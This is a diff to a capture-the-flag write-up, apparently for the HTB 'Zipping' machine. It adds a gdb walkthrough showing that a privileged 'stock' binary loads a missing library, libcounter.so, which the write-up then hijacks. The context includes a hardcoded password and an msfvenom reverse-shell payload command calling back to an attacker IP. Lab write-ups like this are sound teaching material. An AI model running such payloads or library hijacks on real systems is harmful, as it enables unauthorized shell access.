@@ -17,6 +17,7 @@ tags:
     - file-inclusion
     - null-byte
     - ltrace
+    - gdb
     - strings
     - shared-object
     - msfvenom
@@ -533,7 +534,7 @@ Error: The information entered is incorrect
 The stock has been updated correctly.
 ```
 
-### Shared library object exploit
+### Investigating binary
 
 To further analyze the binary, I downloaded it locally as the box lacked the `ltrace` tool. It's evident that the entered password is compared to the string `St0ckM4nager`.
 
@@ -571,6 +572,87 @@ read(0, St0ckM4nager
 "St0ckM4nager\n", 1024)         = 13
 openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
 ```
+
+### Disassembly with gdb (Alternative)
+
+I can also use gdb to disassemble the binary and inbvstigate it.
+
+```bash
+❯ gdb ./stock
+GNU gdb (Debian 13.2-1) 13.2
+
+Reading symbols from ./stock...
+(No debugging symbols found in ./stock)
+
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x00000000000012ba <+0>: push   %rbp
+   0x00000000000012bb <+1>: mov    %rsp,%rbp
+   0x00000000000012be <+4>: sub    $0x100,%rsp
+<---snip--->
+   0x00000000000013db <+289>:  mov    %rax,%rdi
+   0x00000000000013de <+292>:  call   0x10b0 <dlopen@plt>
+   0x00000000000013e3 <+297>:  mov    %rax,-0x20(%rbp)
+<---snip--->
+```
+
+The [dltopen()](https://unix.stackexchange.com/questions/611730/does-dlopen-performs-dynamic-linking-by-invoking-dynamic-linker-ld-linux-so) call was interesting, it is supposed to load a library dynamically and store the return value. Ideally, `rax` is supposed to store the return value and `rdi` is typically the first argument passed to a function call. This means `rdi` would contain the first argument for the dynamic linking i.e. the library.
+
+To investigate this, I set a breakpoint at the dltopen() call, and run the binary again.
+`b *main +292` sets a breakpoint on main at an offset of 292.
+
+```bash
+(gdb) b *main +292
+Breakpoint 2 at 0x5555555553de
+(gdb) info b
+Num     Type           Disp Enb Address            What
+2       breakpoint     keep y   0x00005555555553de <main+292>
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/kali/HTB/Zipping/loot/stock
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Enter the password: St0ckM4nager
+
+Breakpoint 2, 0x00005555555553de in main ()
+(gdb) info registers
+rax            0x7fffffffd400      140737488344064
+rbx            0x7fffffffd5f8      140737488344568
+rcx            0x7a                122
+rdx            0x6f                111
+rsi            0x1                 1
+rdi            0x7fffffffd400      140737488344064
+<---snip--->
+```
+
+Now, when I step into the dltopen() function, I can see the arguments to it. Alternatively, I can also use the `examine/string` or `x/s` gdb command to dump the contents of the rdi register.
+
+```bash
+(gdb) step
+Single stepping until exit from function main,
+which has no line number information.
+___dlopen (file=0x7fffffffd400 "/home/rektsu/.config/libcounter.so", mode=1) at ./dlfcn/dlopen.c:77
+77  ./dlfcn/dlopen.c: No such file or directory.
+
+(gdb) x/s $rdi
+0x7fffffffd400: "/home/rektsu/.config/libcounter.so"
+(gdb) c
+Continuing.
+
+================== Menu ==================
+
+1) See the stock
+2) Edit the stock
+3) Exit the program
+
+Select an option:
+```
+
+This means the `/home/rektsu/.config/libcounter.so` library is dynamically linked password after entering the password.
+
+### Shared library object exploit
 
 I found a [blog post](https://tbhaxor.com/exploiting-shared-library-misconfigurations/) that explained how to exploit shared library injection.
 
@@ -635,7 +717,7 @@ msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f elf-so -
 
 **Pwned**
 
-# ![Pwned](./images/Pwned.png)
+<!-- ![Pwned](./images/Pwned.png) -->
 
 ---
 
